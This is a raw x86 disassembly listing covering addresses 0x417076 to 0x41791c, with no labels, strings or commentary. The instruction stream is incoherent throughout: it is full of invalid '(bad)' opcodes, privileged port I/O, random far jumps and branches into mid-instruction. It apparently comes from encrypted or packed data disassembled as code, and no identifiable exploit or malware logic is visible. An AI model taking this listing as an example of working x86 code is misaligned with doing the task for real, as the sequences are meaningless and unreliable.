  417076:	int    0xe6
  417078:	fld    DWORD PTR [eax]
  41707a:	pop    es
  41707b:	(bad)  
  41707c:	pmaxsw mm5,mm4
  41707f:	dec    ah
  417081:	pop    es
  417082:	vpavgw ymm5,ymm2,YMMWORD PTR [esi-0x3e1f1549]
  41708a:	in     eax,dx
  41708b:	retf   0xccf5
  41708e:	aad    0xd4
  417090:	int    0xb9
  417092:	cld    
  417093:	icebp  
  417094:	sti    
  417095:	int    0xe0
  417097:	fdivr  DWORD PTR [ebp-0x7383c0c]
  41709d:	(bad)  
  4170a0:	call   0xe12b2a72
  4170a5:	mov    bh,0xf2
  4170a7:	hlt    
  4170a8:	out    0xe5,eax
  4170aa:	loope  0x417081
  4170ac:	repz lds edi,FWORD PTR [ebx-0x304b2a32]
  4170b3:	(bad)  
  4170b5:	shl    al,cl
  4170b7:	fsub   st,st(3)
  4170b9:	fdivp  st(7),st
  4170bb:	loop   0x41709f
  4170bd:	invd   
  4170bf:	fcmovnb st,st(1)
  4170c1:	(bad)  
  4170c3:	mov    al,0xf0
  4170c5:	mov    esi,0xb6e1b3e6
  4170ca:	ror    cl,0xe9
  4170cd:	mov    al,0xb8
  4170cf:	mov    esp,0xd4d9d1d5
  4170d4:	iret   
  4170d5:	clc    
  4170d6:	cmc    
  4170d7:	std    
  4170d8:	out    0x2,al
  4170da:	loop   0x4170b4
  4170dc:	out    0xcb,al
  4170de:	jmp    0xc6ce:0xb91313e2
  4170e5:	out    0xf5,eax
  4170e7:	jmp    0xe6f731a7
  4170ec:	out    0xef,al
  4170ee:	cli    
  4170ef:	lock add ebx,eax
  4170f2:	hlt    
  4170f3:	cld    
  4170f4:	fcmovbe st,st(7)
  4170f6:	loope  0x4170c8
  4170f8:	add    al,BYTE PTR [esi]
  4170fa:	aam    0xd7
  4170fc:	out    dx,eax
  4170fd:	clc    
  4170fe:	enter  0x108,0x6
  417102:	mov    esp,0xdcc0cef1
  417107:	rcl    edi,1
  417109:	in     eax,dx
  41710a:	sti    
  41710b:	mov    ebx,0xc9dcc4fb
  417110:	in     al,dx
  417111:	repnz repz icebp 
  417114:	add    bh,BYTE PTR [esi+0xbddc2f1]
  41711a:	in     al,0xe5
  41711c:	add    ecx,DWORD PTR [edx]
  41711e:	psubq  mm4,mm1
  417121:	leave  
  417122:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417123:	fsubr  DWORD PTR [ecx-0x340c0f1a]
  417129:	in     al,0xf8
  41712b:	test   ebx,0xd0fae5ef
  417131:	xlat   BYTE PTR ds:[ebx]
  417132:	fdiv   st,st(5)
  417134:	ret    0xdbde
  417137:	add    eax,DWORD PTR [ecx]
  417139:	clc    
  41713a:	(bad)  
  41713c:	(bad)  
  41713d:	or     eax,0xcbdbdedd
  417142:	retf   0xcdf7
  417145:	iret   
  417146:	in     eax,0xc9
  417148:	mov    al,0xb2
  41714a:	(bad)  
  41714b:	mov    ch,0xd8
  41714d:	(bad)  
  41714e:	in     al,dx
  41714f:	push   DWORD PTR [ebp-0x103f272e]
  417155:	mov    esp,0xe1f4fbdf
  41715a:	in     al,0x0
  41715c:	or     esp,esi
  41715e:	fdiv   st,st(3)
  417160:	add    DWORD PTR [esi],ecx
  417162:	leave  
  417163:	(bad)  
  417164:	loope  0x41712f
  417166:	repz int 0xac
  417169:	cli    
  41716a:	retf   0xf9ed
  41716d:	(bad)  
  41716e:	cld    
  41716f:	(bad)  
  417170:	jecxz  0x41713f
  417172:	mov    edi,0xc2e3e2dc
  417177:	shl    esi,0xf2
  41717a:	loopne 0x41713a
  41717c:	ffreep st(5)
  41717e:	jmp    0x417186
  417180:	(bad)  
  417181:	jmp    0xe60d2f76
  417186:	jmp    0x417138
  417188:	jmp    0x417178
  41718a:	out    dx,eax
  41718b:	mov    edx,0xcff6eef1
  417190:	div    DWORD PTR [eax-0x3f2b2349]
  417196:	add    bh,bh
  417198:	cld    
  417199:	(bad)  [ebx]
  41719b:	jmp    0xdb2f779e
  4171a0:	jmp    0xeb1a5ead
  4171a5:	mov    esp,0xfafaecf5
  4171aa:	sti    
  4171ab:	lock aad 0xb6
  4171ae:	int3   
  4171af:	in     al,dx
  4171b0:	leave  
  4171b1:	xlat   BYTE PTR ds:[ebx]
  4171b2:	fxtract 
  4171b4:	jecxz  0x417172
  4171b6:	int    0xc3
  4171b8:	add    eax,0xc903e0e3
  4171bd:	add    ah,bl
  4171bf:	cld    
  4171c0:	push   es
  4171c1:	cld    
  4171c2:	loope  0x417175
  4171c4:	mov    esp,0xc1f0e1dd
  4171c9:	stc    
  4171ca:	fld    st(6)
  4171cc:	repnz mov al,0xc9
  4171cf:	enter  0xd6ea,0xbc
  4171d3:	add    bl,bh
  4171d5:	cld    
  4171d6:	ret    
  4171d7:	xlat   BYTE PTR ds:[ebx]
  4171d8:	fld    DWORD PTR [ecx]
  4171da:	push   es
  4171db:	add    al,0x3
  4171dd:	fimul  WORD PTR [ecx]
  4171df:	fucomi st,st(4)
  4171e1:	add    esp,ebx
  4171e3:	fcomip st,st(6)
  4171e5:	mov    bl,0xe9
  4171e7:	iret   
  4171e8:	in     al,dx
  4171e9:	mov    edx,0xcfc6e8e0
  4171ee:	clc    
  4171ef:	icebp  
  4171f0:	cld    
  4171f1:	ret    0xb6fb
  4171f4:	(bad)  
  4171f6:	mov    esp,0xd7f2f404
  4171fb:	(bad)  
  4171fc:	fadd   DWORD PTR [edx]
  4171fe:	frstpm(287 only) 
  417200:	out    0x12,al
  417202:	mov    ecx,0xe1bdd6d2
  417207:	mov    ah,0xc7
  417209:	loop   0x4171c4
  41720b:	sar    bl,cl
  41720d:	shr    esp,1
  41720f:	aam    0xe8
  417211:	std    
  417212:	(bad)  
  417213:	call   0xe6023a06
  417218:	cmc    
  417219:	aad    0xf9
  41721b:	dec    eax
  41721d:	add    bh,bl
  41721f:	enter  0x4cb,0xab
  417223:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417224:	iret   
  417225:	loop   0x417209
  417227:	in     al,0xb6
  417229:	mov    dl,0xf6
  41722b:	into   
  41722c:	lods   eax,DWORD PTR ds:[esi]
  41722d:	sar    BYTE PTR [edi-0x3e3d1434],cl
  417233:	sar    ebp,0xfd
  417236:	std    
  417237:	repnz test cl,0xd0
  41723b:	add    ebp,eax
  41723d:	cmc    
  41723e:	jmp    0x417223
  417240:	push   cs
  417241:	shl    dh,cl
  417243:	in     al,0xec
  417245:	shl    esp,cl
  417247:	xlat   BYTE PTR ds:[ebx]
  417248:	xlat   BYTE PTR ds:[ebx]
  417249:	in     eax,dx
  41724a:	icebp  
  41724b:	mov    edx,0xbad8eab7
  417250:	loop   0x417221
  417252:	fidivr WORD PTR [ebp-0x130a4709]
  417258:	(bad)  
  417259:	fmul   st,st(3)
  41725b:	loop   0x417254
  41725d:	jmp    0xe3cd:0x40affcd
  417264:	iret   
  417265:	mov    dh,0xeb
  417267:	into   
  417268:	jmp    0x41725f
  41726a:	(bad)  
  41726b:	(bad)  
  41726c:	cli    
  41726d:	mov    ah,0xb5
  41726f:	jmp    0xfecd:0xcdc9bddd
  417276:	(bad)  
  417277:	aad    0xe5
  417279:	jmp    0xe00d:0xf9eef7e1
  417280:	push   es
  417281:	or     al,cl
  417283:	loopne 0x417271
  417285:	mov    esp,0xfbc6c8b0
  41728a:	vshufps xmm1,xmm6,xmm7,0xb5
  41728f:	cli    
  417290:	leave  
  417291:	repz (bad) 
  417293:	loop   0x417265
  417295:	int    0xcd
  417297:	mov    esp,0xc6e3c404
  41729c:	(bad)  
  41729d:	fabs   
  41729f:	in     eax,0xc8
  4172a1:	icebp  
  4172a2:	mov    ecx,0xb1d3cff0
  4172a7:	ror    eax,cl
  4172a9:	leave  
  4172aa:	mov    ebx,0xf9fee5fa
  4172af:	jmp    0x417262
  4172b1:	(bad)  
  4172b3:	into   
  4172b4:	clc    
  4172b5:	in     eax,0xf2
  4172b7:	ret    0x6f9
  4172ba:	leave  
  4172bb:	or     edi,eax
  4172bd:	stc    
  4172be:	loop   0x4172c2
  4172c0:	adc    ecx,DWORD PTR [edx+edx*8]
  4172c3:	mov    esp,0xc0ebd6f3
  4172c8:	out    dx,eax
  4172c9:	int    0xe6
  4172cb:	fucomip st,st(6)
  4172cd:	lods   al,BYTE PTR ds:[esi]
  4172ce:	hlt    
  4172cf:	add    edx,esp
  4172d1:	(bad)  
  4172d2:	ret    
  4172d3:	std    
  4172d4:	in     al,dx
  4172d5:	cld    
  4172d6:	loopne 0x4172d5
  4172d8:	fnstcw WORD PTR [eax-0x1111fefc]
  4172de:	cmc    
  4172df:	(bad)  
  4172e0:	jecxz  0x4172be
  4172e2:	shl    esp,cl
  4172e4:	mov    esi,0xade0d4e4
  4172e9:	xlat   BYTE PTR ds:[ebx]
  4172ea:	in     eax,0xe6
  4172ec:	(bad)  
  4172ed:	out    dx,al
  4172ee:	les    esi,FWORD PTR [esi-0x3e232804]
  4172f4:	(bad)  
  4172f6:	shl    dh,0xfa
  4172f9:	aam    0xfa
  4172fb:	aad    0xe2
  4172fd:	ud2    
  4172ff:	out    0x0,eax
  417301:	in     eax,dx
  417302:	retf   
  417303:	test   eax,0xb4c3ccca
  417308:	cmc    
  417309:	lock mov edx,0xd5e5c5f5
  41730f:	mov    edi,0xfcf7c9df
  417314:	mov    ebp,0xe5f2f2d5
  417319:	hlt    
  41731a:	call   eax
  41731c:	mul    ch
  41731e:	into   
  41731f:	push   cs
  417320:	psubd  mm5,QWORD PTR [ecx-0x311b395a]
  417327:	lods   eax,DWORD PTR ds:[esi]
  417328:	(bad)  
  417329:	out    dx,al
  41732a:	out    dx,eax
  41732b:	ror    cl,1
  41732d:	fscale 
  41732f:	repz jmp 0xd71d4c22
  417335:	rol    DWORD PTR ds:0xddc3bcc3,cl
  41733b:	add    eax,0x4f4da0b
  417340:	bswap  ecx
  417342:	jecxz  0x41732a
  417344:	(bad)  
  417345:	retf   0xe4bd
  417348:	icebp  
  417349:	iret   
  41734a:	(bad)  
  41734c:	jmp    0xf0356c45
  417351:	in     al,dx
  417352:	fidiv  DWORD PTR [esi-0x42272644]
  417358:	add    eax,0xf80bcae6
  41735d:	out    dx,eax
  41735e:	std    
  41735f:	fld    DWORD PTR [edx]
  417361:	into   
  417362:	retf   0xe5a9
  417365:	into   
  417366:	hlt    
  417367:	(bad)
  41736a:	(bad)  
  41736b:	mov    al,0xd9
  41736d:	shl    DWORD PTR [edi-0x3282015],cl
  417373:	iret   
  417374:	aam    0xe5
  417376:	loopne 0x41734b
  417378:	loop   0x41733c
  41737a:	loopne 0x41735e
  41737c:	(bad)  
  41737d:	mov    esp,0xeee02eb
  417382:	stos   DWORD PTR es:[edi],eax
  417383:	in     al,dx
  417384:	not    bl
  417386:	xlat   BYTE PTR ds:[ebx]
  417387:	mov    esp,0xc7edcbd6
  41738c:	iret   
  41738d:	leave  
  41738e:	in     al,dx
  41738f:	into   
  417390:	fxch   st(7)
  417392:	mov    eax,0xbfd201ff
  417397:	loopne 0x41735f
  417399:	loop   0x417392
  41739b:	std    
  41739c:	out    dx,al
  41739d:	aam    0xeb
  41739f:	add    al,0xee
  4173a1:	rol    ch,0xcc
  4173a4:	(bad)  
  4173a5:	mov    dh,0xdc
  4173a7:	lods   al,BYTE PTR ds:[esi]
  4173a8:	lods   eax,DWORD PTR ds:[esi]
  4173a9:	loop   0x417396
  4173ab:	mov    dh,0xea
  4173ad:	out    0xe8,al
  4173af:	mov    ch,0xef
  4173b1:	repz ret 
  4173b3:	rcr    dl,0xf8
  4173b6:	mov    esp,0xd704c3c1
  4173bb:	in     eax,0xc1
  4173bd:	add    esi,esp
  4173bf:	fimul  WORD PTR [edi]
  4173c1:	(bad)  
  4173c2:	loopne 0x41738f
  4173c4:	(bad)  
  4173c5:	retf   
  4173c6:	int3   
  4173c7:	xlat   BYTE PTR ds:[ebx]
  4173c8:	lods   eax,DWORD PTR ds:[esi]
  4173c9:	shl    BYTE PTR [ebp-0x23040746],cl
  4173cf:	cli    
  4173d0:	(bad)  
  4173d2:	mov    edi,0xc7e106c0
  4173d7:	or     ecx,DWORD PTR [ebx]
  4173d9:	fmul   st(2),st
  4173db:	fmul   st,st(2)
  4173dd:	jmp    eax
  4173df:	(bad)  
  4173e1:	in     al,0xd0
  4173e3:	jmp    0xc3033e96
  4173e8:	(bad)  
  4173e9:	in     al,dx
  4173ea:	in     eax,0xcf
  4173ec:	mov    cl,0xf9
  4173ee:	rcl    edi,cl
  4173f0:	out    dx,eax
  4173f1:	mov    ebx,0xecfbf5c9
  4173f6:	fild   DWORD PTR [edi]
  4173f8:	in     eax,0xfe
  4173fa:	ret    0xf4e4
  4173fd:	out    0xe8,eax
  4173ff:	ret    0xe9e8
  417402:	call   0xf41064c6
  417407:	xlat   BYTE PTR ds:[ebx]
  417408:	repz test al,0xd9
  41740b:	mov    ecx,0xf4b6e5f5
  417410:	cmc    
  417411:	int3   
  417412:	mov    ecx,0xc0bed9d2
  417417:	shl    al,cl
  417419:	add    ch,dl
  41741b:	or     dh,ah
  41741d:	or     BYTE PTR [esi],al
  41741f:	fucomi st,st(0)
  417421:	add    ebp,DWORD PTR [edi-0x503a1922]
  417427:	iret   
  417428:	leave  
  417429:	jmp    0xdaea:0xf6cdf5b2
  417430:	jecxz  0x417414
  417432:	fcmovnb st,st(0)
  417434:	mov    ch,0xd3
  417436:	out    0xb,al
  417438:	(bad)  
  417439:	not    bh
  41743b:	jmp    0x41744b
  41743d:	jmp    0xb8ce:0xebe8fdc7
  417444:	mov    bh,0xe8
  417446:	mov    ch,0xd5
  417448:	rcr    cl,cl
  41744a:	(bad)  
  41744b:	cli    
  41744c:	out    0xc5,al
  41744e:	int    0xb4
  417450:	out    dx,eax
  417451:	in     eax,dx
  417452:	mov    edi,0xf7e500c8
  417457:	int3   
  417458:	mov    bl,0x8
  41745b:	clc    
  41745c:	jmp    0xae09:0xc4ebcdd6
  417463:	fsubp  st(6),st
  417465:	out    0xad,al
  417467:	mov    dh,0xd1
  417469:	out    dx,al
  41746a:	xlat   BYTE PTR ds:[ebx]
  41746b:	(bad)  
  41746c:	mov    edi,0xffb2d6cc
  417471:	(bad)  
  417472:	mov    eax,0xdef2e1c3
  417477:	loope  0x417450
  417479:	fcmovb st,st(6)
  41747b:	fcomi  st,st(4)
  41747d:	add    ah,ch
  41747f:	out    dx,al
  417480:	int3   
  417481:	pop    es
  417482:	mov    cl,0xec
  417484:	ror    edx,1
  417486:	mov    cl,0xb6
  417488:	rcl    eax,1
  41748a:	aam    0xb0
  41748c:	aad    0xc8
  41748e:	into   
  41748f:	mov    ebp,0xbdfadef5
  417494:	fcmovbe st,st(7)
  417496:	cli    
  417497:	(bad)  
  41749a:	lock loopne 0x417494
  41749d:	out    dx,al
  41749e:	jmp    0xb22b648c
  4174a3:	mov    edi,0xf3cff1e9
  4174a8:	in     al,dx
  4174a9:	sar    ebx,cl
  4174ab:	aad    0xcc
  4174ad:	dec    ch
  4174af:	stc    
  4174b0:	jmp    0xedde:0xe7dad0ed
  4174b7:	shl    ch,1
  4174b9:	(bad)  
  4174ba:	icebp  
  4174bb:	fisttp WORD PTR [ecx]
  4174bd:	les    ecx,FWORD PTR [ebx+eax*1]
  4174c0:	int3   
  4174c1:	add    eax,0xd6ace2df
  4174c6:	lods   eax,DWORD PTR ds:[esi]
  4174c7:	ret    
  4174c8:	cmc    
  4174c9:	ret    0xbacd
  4174cc:	xlat   BYTE PTR ds:[ebx]
  4174cd:	cmc    
  4174ce:	mov    bh,0xc9
  4174d0:	repz fucomp st(5)
  4174d3:	out    dx,al
  4174d4:	rol    eax,1
  4174d6:	cli    
  4174d7:	rcr    esi,0xff
  4174da:	(bad)  
  4174db:	or     esp,ebp
  4174dd:	push   cs
  4174de:	or     eax,0xa8cefce3
  4174e3:	fidiv  WORD PTR [ecx-0x12080c1b]
  4174e9:	jmp    0x4174d0
  4174eb:	stc    
  4174ec:	fidivr DWORD PTR [ebx-0x2114a2f]
  4174f2:	jmp    0x72452ba
  4174f7:	out    0x4,eax
  4174f9:	in     eax,0xe6
  4174fb:	leave  
  4174fc:	in     eax,0x3
  4174fe:	or     al,bl
  417500:	(bad)  
  417501:	int3   
  417502:	mov    bl,0xe1
  417504:	mov    dl,0xc7
  417506:	(bad)  
  417507:	loope  0x4174be
  417509:	lods   al,BYTE PTR ds:[esi]
  41750a:	repz jmp 0x4174f9
  41750d:	out    dx,al
  41750e:	icebp  
  41750f:	(bad)  
  417510:	mov    ecx,0xc7e8c3d8
  417515:	hlt    
  417516:	loop   0x4174e9
  417518:	loope  0x4174f4
  41751a:	inc    BYTE PTR [esi]
  41751c:	fsub   st,st(6)
  41751e:	enter  0x1dd,0xd9
  417522:	ret    
  417523:	mov    edi,0xd5cac4be
  417528:	sti    
  417529:	sar    BYTE PTR [ebx-0x1119494f],0xd9
  417530:	stc    
  417531:	enter  0xbae3,0xdc
  417535:	rcr    bl,cl
  417537:	aam    0xbc
  417539:	test   ebx,0xd402dbc0
  41753f:	aam    0xdf
  417541:	add    eax,0xbcceecae
  417546:	out    0xce,eax
  417548:	(bad)  
  417549:	(bad)
  41754c:	mov    ecx,0xdcd2d1f5
  417551:	iret   
  417552:	hlt    
  417553:	loope  0x41752c
  417555:	stc    
  417556:	in     al,0xc2
  417558:	clc    
  417559:	aad    0xc2
  41755b:	loope  0x417567
  41755d:	(bad)  
  41755e:	(bad)  
  417560:	(bad)  
  417561:	fst    st(2)
  417563:	shr    edx,1
  417565:	mov    bl,0xc7
  417567:	mov    esp,0xc0cbd7e8
  41756c:	dec    bh
  41756e:	call   esi
  417570:	(bad)  
  417572:	fxtract 
  417574:	mov    edi,0xe206ddd8
  417579:	icebp  
  41757a:	stc    
  41757b:	out    dx,eax
  41757c:	cld    
  41757d:	cld    
  41757e:	inc    ch
  417580:	fldpi  
  417582:	jmp    0x41752c
  417584:	test   al,0xb7
  417586:	out    dx,eax
  417587:	loope  0x417557
  417589:	fabs   
  41758b:	in     al,0xed
  41758d:	into   
  41758e:	retf   0xfac9
  417591:	mov    ebp,0x6c0fbd4
  417596:	mov    edi,0xebd0fbf8
  41759b:	jmp    0xdc4c3b95
  4175a0:	fild   DWORD PTR [esp+edi*4]
  4175a3:	mov    cl,0xcd
  4175a5:	cmc    
  4175a6:	lock ret 
  4175a8:	mov    ch,0xf0
  4175aa:	repz push ebp
  4175ad:	cli    
  4175ae:	call   0xed04329b
  4175b3:	sti    
  4175b4:	add    bl,dl
  4175b6:	cld    
  4175b7:	push   es
  4175b8:	cld    
  4175b9:	or     dh,bh
  4175bb:	retf   
  4175bc:	out    0xff,eax
  4175be:	fsub   st(7),st
  4175c0:	add    eax,0xcccfce08
  4175c5:	lock rep lods eax,DWORD PTR ds:[esi]
  4175c8:	shl    ebx,cl
  4175ca:	mov    bl,0xcf
  4175cc:	fsub   st,st(6)
  4175ce:	(bad)  
  4175d0:	idiv   al
  4175d2:	fmul   st,st(0)
  4175d4:	sar    DWORD PTR [edi-0x2d06f930],1
  4175da:	inc    al
  4175dc:	(bad)  
  4175dd:	jmp    0x4175d7
  4175df:	fist   WORD PTR [ebx]
  4175e1:	loopne 0x41759b
  4175e3:	rcr    ah,0xdc
  4175e6:	in     al,dx
  4175e7:	mov    dl,0xd7
  4175e9:	rcl    esp,1
  4175eb:	les    ebp,FWORD PTR [ebp+0x2ded6e4]
  4175f1:	hlt    
  4175f2:	fsubrp st(1),st
  4175f4:	test   esi,0xf20adfda
  4175fa:	jmp    0xd63e65e3
  4175ff:	add    esi,ecx
  417601:	jmp    0xdbc1:0xdcb3acbf
  417608:	test   eax,0xbab7d0c9
  41760d:	shr    ebp,cl
  41760f:	enter  0xf6ce,0xb8
  417613:	int3   
  417614:	ret    
  417615:	(bad)  
  417617:	in     al,0xd1
  417619:	in     eax,0xf4
  41761b:	lock (bad) 
  41761d:	loope  0x41760c
  41761f:	iret   
  417620:	jmp    0xc7fe3012
  417625:	mov    esp,0xe7acceca
  41762a:	lock rcl ch,0xee
  41762e:	jmp    0x41762c
  417630:	fdivr  st(6),st
  417632:	enter  0xc1d5,0xfe
  417636:	repnz hlt 
  417638:	(bad)  
  41763a:	jecxz  0x417643
  41763c:	psraw  mm1,mm0
  41763f:	loope  0x417654
  417641:	out    dx,eax
  417642:	mov    edi,0xc1cabcad
  417647:	mov    bl,0xb4
  417649:	repnz mov ch,0xcf
  41764c:	shl    BYTE PTR [eax-0x35172031],1
  417652:	not    ecx
  417654:	rol    BYTE PTR ds:0xf8dbfae4,0xc7
  41765b:	or     bl,cl
  41765d:	add    ecx,edi
  41765f:	cld    
  417660:	fadd   DWORD PTR [ebx]
  417662:	test   eax,0xedded1c2
  417667:	shl    dl,0xc5
  41766a:	jmp    0xb4dd:0xd8fec5cd
  417671:	test   bh,0xed
  417674:	iret   
  417675:	add    eax,DWORD PTR [edx]
  417677:	mov    edx,0xf0c2fcd7
  41767c:	shl    al,0xe0
  41767f:	int3   
  417680:	call   0xd2045a96
  417685:	mov    dh,0xc6
  417687:	(bad)  
  417688:	jmp    0xc83d4868
  41768d:	hlt    
  41768e:	aad    0xd4
  417690:	fidivr DWORD PTR [eax-0x28052206]
  417696:	in     eax,dx
  417697:	(bad)  
  417698:	ffreep st(6)
  41769a:	dec    BYTE PTR [edx]
  41769c:	add    DWORD PTR [ecx],eax
  41769e:	aad    0xc6
  4176a0:	jmp    0xbcbc:0xf1b8aefc
  4176a7:	(bad)  
  4176a8:	repnz div BYTE PTR [esi-0x2416492d]
  4176af:	mov    edi,0x3d3bedc
  4176b4:	(bad)  
  4176b6:	(bad)
  4176b9:	(bad)
  4176bc:	(bad)  
  4176bd:	loopne 0x4176bc
  4176bf:	push   cs
  4176c0:	repz jmp ebp
  4176c3:	enter  0xefde,0xc8
  4176c7:	lods   al,BYTE PTR ds:[esi]
  4176c8:	ret    0xd3b2
  4176cb:	cli    
  4176cc:	(bad)  
  4176cd:	out    dx,al
  4176ce:	mov    edi,0xf3f0f4fe
  4176d3:	ffree  st(7)
  4176d5:	(bad)  
  4176d6:	mov    edi,0x1e4d7fb
  4176db:	(bad)  
  4176dc:	fld    DWORD PTR [edx]
  4176de:	aam    0xee
  4176e0:	add    al,0xe3
  4176e2:	ret    0xdfbe
  4176e5:	jmp    0xbbc5:0xeee5ceae
  4176ec:	mov    cl,0xfd
  4176ee:	clc    
  4176ef:	mov    dh,0xf1
  4176f1:	ret    
  4176f2:	call   0xf11863fe
  4176f7:	int3   
  4176f8:	aad    0xe3
  4176fa:	rcr    cl,0xd7
  4176fd:	add    ch,ch
  4176ff:	pop    es
  417700:	iret   
  417701:	leave  
  417702:	fsub   st(1),st
  417704:	sar    DWORD PTR [esi-0x320f3e33],1
  41770a:	mov    ecx,0xd6f4f1ce
  41770f:	jmp    0xeee1:0xd5d5e9bd
  417716:	(bad)
  417719:	cld    
  41771a:	fdivrp st(0),st
  41771c:	sar    eax,0xcd
  41771f:	jmp    0xdcb0:0xc1acde07
  417726:	call   0xe10a29f7
  41772b:	(bad)  
  41772c:	int3   
  41772d:	in     eax,dx
  41772e:	jmp    0x4176fd
  417730:	mov    cl,0xd3
  417732:	fld    QWORD PTR [ebx]
  417734:	inc    DWORD PTR [esi]
  417736:	fst    st(3)
  417738:	loopne 0x4176fa
  41773a:	retf   0xbdf0
  41773d:	fimul  WORD PTR [edi]
  41773f:	add    BYTE PTR [eax],al
  417741:	into   
  417742:	fbld   TBYTE PTR [esi-0x3d3f1d52]
  417748:	mov    cl,0xb6
  41774a:	enter  0xf3d7,0xeb
  41774e:	(bad)
  417751:	retf   0xf1bf
  417754:	add    edi,esi
  417756:	out    0x3,eax
  417758:	aad    0xc0
  41775a:	(bad)  
  41775b:	out    0xe4,al
  41775d:	(bad)  
  41775e:	hlt    
  41775f:	call   0xae018277
  417764:	repnz (bad) 
  417766:	shl    DWORD PTR [ebp-0x4e2f381d],cl
  41776c:	mov    eax,0xcbb6dcd6
  417771:	sar    bl,1
  417773:	neg    ebx
  417775:	ret    
  417776:	(bad)  
  417777:	(bad)  
  417778:	jmp    0xfcdf:0xdbfd06e3
  41777f:	out    dx,al
  417780:	adc    ah,dl
  417782:	loopne 0x41772d
  417784:	int3   
  417785:	mov    al,0xeb
  417787:	jmp    0xf0b5:0xd0ceeaf7
  41778e:	(bad)  
  41778f:	(bad)  
  417790:	mov    edx,0xbde0facf
  417795:	aad    0xdf
  417797:	mov    edx,0xdadcda01
  41779c:	call   0xb3a737d
  4177a1:	or     cl,ch
  4177a3:	fucomp st(5)
  4177a5:	int    0xab
  4177a7:	(bad)  
  4177a8:	loop   0x4177a3
  4177aa:	out    0xf6,eax
  4177ac:	mov    al,0xb0
  4177ae:	les    edi,FWORD PTR [esi+0x7e0cfe3]
  4177b4:	pop    es
  4177b5:	fcomip st,st(6)
  4177b7:	add    al,0xbc
  4177b9:	clc    
  4177ba:	xlat   BYTE PTR ds:[ebx]
  4177bb:	shr    ebx,0xfe
  4177be:	std    
  4177bf:	add    BYTE PTR [eax],cl
  4177c1:	fcmove st,st(5)
  4177c3:	mov    esp,0xebbde7a9
  4177c8:	jmp    0x41777b
  4177ca:	jmp    0xcdd4:0xcfefcfcb
  4177d1:	fdivp  st(4),st
  4177d3:	cli    
  4177d4:	sar    ebp,0xfd
  4177d7:	cmc    
  4177d8:	mov    esp,0xdbf8c7db
  4177dd:	lds    eax,FWORD PTR [ecx+eiz*8]
  4177e0:	add    ah,ah
  4177e2:	retf   
  4177e3:	loope  0x4177ab
  4177e5:	aad    0xf3
  4177e7:	mov    bl,0xc7
  4177e9:	repz iret 
  4177eb:	mov    cl,0xd4
  4177ed:	int    0xdf
  4177ef:	xlat   BYTE PTR ds:[ebx]
  4177f0:	enter  0xcffb,0xcd
  4177f4:	mov    eax,0xf5d1c5cc
  4177f9:	add    DWORD PTR [ebx],ecx
  4177fb:	enter  0xebfe,0xe6
  4177ff:	or     ah,ah
  417801:	push   es
  417802:	(bad)  
  417803:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417804:	(bad)  
  417805:	mov    bl,0xd2
  417807:	shr    bh,cl
  417809:	cli    
  41780a:	not    bh
  41780c:	int    0xf7
  41780e:	iret   
  41780f:	in     eax,dx
  417810:	aad    0xcc
  417812:	fcomi  st,st(5)
  417814:	cli    
  417815:	std    
  417816:	(bad)  
  417818:	(bad)  
  417819:	shl    cl,1
  41781b:	mul    dl
  41781d:	cmc    
  41781e:	aad    0xfa
  417820:	enter  0xc6da,0xbe
  417824:	mov    bh,0xf3
  417826:	jmp    0x4177ec
  417828:	test   eax,0xf1c7ebf7
  41782d:	test   ah,0xd1
  417830:	loop   0x417807
  417832:	aam    0xf8
  417834:	fidivr DWORD PTR [edi-0x23182745]
  41783a:	neg    ch
  41783c:	fld    DWORD PTR [edi]
  41783e:	out    dx,eax
  41783f:	or     al,BYTE PTR ds:0xaef2dcfe
  417845:	ret    0xc2ee
  417848:	aad    0xcc
  41784a:	sti    
  41784b:	jmp    0x417816
  41784d:	(bad)  
  41784e:	in     eax,dx
  41784f:	repnz fninit 
  417852:	mov    ebx,0xc0d3f1e3
  417857:	cld    
  417858:	stc    
  417859:	jecxz  0x417863
  41785b:	jmp    0xcdcf:0xc801e400
  417862:	call   0xde373049
  417867:	enter  0xecc5,0xcf
  41786b:	cmc    
  41786c:	mov    eax,0xffb6d4d9
  417871:	sar    DWORD PTR [esi-0xd262200],1
  417877:	shl    bh,cl
  417879:	lock neg ebx
  41787c:	fmul   QWORD PTR [edi]
  41787e:	or     ch,bh
  417880:	call   0xf1273783
  417885:	(bad)
  417888:	sar    DWORD PTR [edx-0x332e114c],1
  41788e:	xlat   BYTE PTR ds:[ebx]
  41788f:	xlat   BYTE PTR ds:[ebx]
  417890:	leave  
  417891:	mul    ebx
  417893:	ret    0x2d8
  417896:	clc    
  417897:	(bad)  
  417899:	fsub   st,st(3)
  41789b:	retf   
  41789c:	neg    eax
  41789e:	out    dx,al
  41789f:	or     bh,dl
  4178a1:	or     dh,BYTE PTR [ebx-0xb0d5a51]
  4178a7:	mov    bh,0xb1
  4178a9:	enter  0xc5b0,0xea
  4178ad:	repz mov eax,0xe9f0bee9
  4178b3:	sti    
  4178b4:	mov    ch,0xfb
  4178b6:	rol    ebp,cl
  4178b8:	in     al,0xd1
  4178ba:	pop    es
  4178bb:	enter  0xdde7,0x7
  4178bf:	int3   
  4178c0:	pop    es
  4178c1:	adc    esp,ebx
  4178c3:	retf   
  4178c4:	test   al,0xae
  4178c6:	mov    dl,0xaa
  4178c8:	loope  0x417880
  4178ca:	(bad)  
  4178cb:	mov    cl,0xd0
  4178cd:	jmp    0xe21566cc
  4178d2:	ror    esi,1
  4178d4:	fdivr  st(2),st
  4178d6:	fsubr  st(3),st
  4178d8:	push   es
  4178d9:	test   dl,0xb
  4178dc:	clc    
  4178dd:	ror    dh,0xed
  4178e0:	in     eax,0xfe
  4178e2:	iret   
  4178e3:	leave  
  4178e4:	mov    esi,0xacdbe8b3
  4178e9:	mov    ebx,0xb7add5cd
  4178ee:	repz retf 0xd7ea
  4178f2:	add    ecx,eax
  4178f4:	inc    edx
  4178f6:	loope  0x4178d2
  4178f8:	fcmovnb st,st(2)
  4178fa:	xlat   BYTE PTR ds:[ebx]
  4178fb:	add    eax,0x9fadafb
  417900:	loop   0x4178cf
  417902:	shr    BYTE PTR [esi-0x1617101e],cl
  417908:	xlat   BYTE PTR ds:[ebx]
  417909:	loopne 0x4178ef
  41790b:	aad    0xea
  41790d:	mov    ebx,0xd9f9eff7
  417912:	cli    
  417913:	int3   
  417914:	xlat   BYTE PTR ds:[ebx]
  417915:	int    0xdc
  417917:	(bad)  
  417919:	test   ah,0xd5
  41791c:	out    dx,eax
